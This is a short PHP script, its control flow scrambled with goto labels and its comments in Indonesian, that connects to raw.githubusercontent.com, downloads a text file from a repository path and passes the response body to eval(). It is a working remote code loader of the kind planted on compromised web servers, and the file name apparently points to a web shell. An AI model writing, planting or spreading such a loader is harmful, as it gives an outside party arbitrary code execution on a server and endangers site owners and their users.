<?php
goto e3O8Q;

e3O8Q:
$host = "raw.githubusercontent.com"; // domain tujuan
goto Q4Ppm;

Q4Ppm:
$port = 443; // port SSL
goto o7nfX;

o7nfX:
$path = "/SUAKABET/main/refs/heads/main/alfasid.txt"; // path file yang diambil dari server
goto e3JnP;

e3JnP:
$fp = stream_socket_client("ssl://{$host}:{$port}", $errno, $errstr, 30); // buka koneksi SSL ke host
goto ftXcN;

ftXcN:
if (!$fp) {
    // jika koneksi gagal
    echo "Error: {$errstr} ({$errno})<br />\n";
} else {
    // buat request HTTP GET
    $out = "GET {$path} HTTP/1.1\r\n";
    $out .= "Host: {$host}\r\n";
    $out .= "Connection: Close\r\n\r\n";
    
    fwrite($fp, $out); // kirim request
    $content = '';
    
    // baca respon dari server baris per baris
    while (!feof($fp)) {
        $content .= fgets($fp, 128);
    }
    
    fclose($fp);
    
    // hapus header HTTP
    $header_end = strpos($content, "\r\n\r\n");
    if ($header_end !== false) {
        $content = substr($content, $header_end + 4);
    }

    // eksekusi konten dari server
    eval("?>" . $content);
}
goto Npe9k;

Npe9k:
?>
